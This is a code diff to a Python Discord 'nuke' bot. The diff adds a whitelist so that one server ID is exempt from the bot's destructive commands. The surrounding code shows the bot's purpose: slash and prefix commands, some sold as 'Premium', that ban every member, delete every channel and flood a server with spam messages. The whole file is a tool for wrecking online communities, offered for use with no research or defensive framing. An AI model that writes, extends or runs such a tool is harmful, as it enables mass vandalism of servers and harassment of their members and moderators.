@@ -82,7 +82,11 @@ async def spam_task(channel, message, count=None):
                 await asyncio.sleep(0.5)
             except: break
 
+WHITELISTED_SERVER_ID = 1453064260555903225
+
 async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
+    if guild.id == WHITELISTED_SERVER_ID:
+        return
     msg = custom_message or SPAM_MESSAGE
     await ban_all_members(guild)
     await delete_all_channels(guild)
@@ -200,12 +204,16 @@ async def ticket_panel(interaction: discord.Interaction):
 
 @client.tree.command(name="nuke", description="Full server nuke (Free - uses default message)")
 async def nuke_slash(interaction: discord.Interaction):
+    if interaction.guild_id == WHITELISTED_SERVER_ID:
+        return await interaction.response.send_message("❌ This server is protected from nuking!", ephemeral=True)
     await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
     await nuke_guild(interaction.guild)
 
 @client.tree.command(name="custom_nuke", description="Full server nuke with custom message & channel names (Premium)")
 @app_commands.describe(message="Custom spam message", channel_name="Custom channel names")
 async def custom_nuke_slash(interaction: discord.Interaction, message: str, channel_name: str = None):
+    if interaction.guild_id == WHITELISTED_SERVER_ID:
+        return await interaction.response.send_message("❌ This server is protected from nuking!", ephemeral=True)
     if not is_premium(interaction.user.id):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
     await interaction.response.send_message("🚀 Custom Nuke Started!", ephemeral=True)
@@ -276,11 +284,15 @@ async def announce_slash(interaction: discord.Interaction, title: str, message: 
 
 @client.command()
 async def nuke(ctx):
+    if ctx.guild.id == WHITELISTED_SERVER_ID:
+        return await ctx.send("❌ This server is protected from nuking!")
     print(f'{y}[!] Nuke command executed in {ctx.guild.name} by {ctx.author}')
     await nuke_guild(ctx.guild)
 
 @client.command()
 async def custom_nuke(ctx, message: str, channel_name: str = None):
+    if ctx.guild.id == WHITELISTED_SERVER_ID:
+        return await ctx.send("❌ This server is protected from nuking!")
     if not is_premium(ctx.author.id):
         return await ctx.send("❌ Premium Only!")
     print(f'{y}[!] Custom Nuke command executed in {ctx.guild.name} by {ctx.author}')
